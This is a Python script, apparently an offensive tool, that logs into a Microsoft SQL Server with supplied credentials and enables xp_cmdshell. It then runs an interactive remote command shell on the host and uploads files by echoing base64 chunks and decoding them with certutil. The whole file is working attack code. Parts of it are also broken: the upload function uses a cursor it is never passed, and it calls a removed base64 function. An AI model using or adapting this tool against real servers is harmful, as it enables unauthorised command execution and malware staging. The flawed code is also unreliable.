#!/usr/bin/env python
from __future__ import print_function
import pymssql as _mssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass


MSSQL_SERVER="10.10.10.10" # change this
MSSQL_USERNAME = "MSSQL_USERNAME" # change this
MSSQL_PASSWORD = "MSSQL_PASSWORD" # change this
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(cursor):
    username = ""
    computername = ""
    cwd = ""
    rows = cursor.fetchall()
    for row in rows[:-3]:
        print(row[0])  # Assuming the value you want is in the first column of the row
    if len(rows) >= 3:
        (username, computername) = rows[-3][0].split('|')
        cwd = rows[-2][0]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())

def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    cursor.execute("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.encodestring(data).split()).decode()
        
    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        cursor.execute("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(cursor)

    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def shell():
    mssql = None
    stored_cwd = None
    try:

        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        cursor = mssql.cursor()
        mssql.autocommit(True) 
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        cursor.execute("EXEC sp_configure 'show advanced options',1;RECONFIGURE;")
        cursor.execute("EXEC SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE;")


        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        cursor.execute("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(cursor)
        stored_cwd = cwd
        
        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(cursor)
            stored_cwd = cwd
            
    except Exception as e:
        print(f"Error: {e}")

    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()
